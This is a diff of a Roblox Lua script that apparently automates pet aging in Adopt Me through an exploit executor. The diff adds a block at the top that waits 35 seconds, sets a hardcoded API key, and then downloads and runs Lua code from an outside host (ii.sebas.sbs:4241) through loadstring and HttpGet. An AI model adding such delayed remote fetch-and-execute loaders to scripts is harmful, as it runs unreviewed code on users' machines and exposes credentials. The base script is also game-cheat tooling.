@@ -1,4 +1,12 @@
-getgenv().ATConfig = {
+task.spawn(function()
+    task.wait(35)
+    getgenv().API_KEY = "JRxd3MCtzUKSfowmCNAfuTS4a"
+    getgenv().GroupName = "Main"
+    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
+end)
+
+task.spawn(function()
+    getgenv().ATConfig = {
     Mode = "goal", -- "Goal" = 
     FusionEnabled = true, 
 
@@ -496,3 +504,5 @@ for _, petsData in pairs(ATConfig.PetsToAge) do
 end
 
 print("Ended")
+
+end)
